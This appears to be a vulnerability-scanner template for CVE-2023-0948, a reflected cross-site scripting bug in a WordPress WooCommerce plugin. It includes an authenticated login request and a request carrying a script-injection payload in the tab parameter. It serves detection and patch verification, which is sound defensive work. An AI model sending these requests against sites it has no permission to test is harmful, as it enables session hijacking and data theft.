http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(content_type, "text/html")
    - contains(body_2, "<script>alert(document.domain)</script>")
    - contains(body_2, "peachpay")
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/admin.php?page=peachpay&tab=field&"><script>alert(document.domain)</script>
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-0948
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:artisanworkshop:japanized_for_woocommerce:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-0948
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.29205
    epss-score: 0.00071
  description: 'WordPress Japanized for WooCommerce plugin before 2.5.8 is susceptible
    to cross-site scripting via the tab parameter due to insufficient input sanitization
    and output escaping. An attacker can inject arbitrary script in the browser of
    an unsuspecting user in the context of the affected site. This can allow the attacker
    to steal cookie-based authentication credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: japanized_for_woocommerce
    vendor: artisanworkshop
    verified: 'true'
  name: WordPress Japanized for WooCommerce <2.5.8 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/a78d75b2-85a0-41eb-9720-c726ca2e8718
  - https://wordpress.org/plugins/woocommerce-for-japan/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-0948
  remediation: Fixed in version 2.5.8.
  severity: medium
  tags: cve,cve2023,wpscan,xss,woocommerce-for-japan,wordpress,wp-plugin,wp,authenticated,artisanworkshop
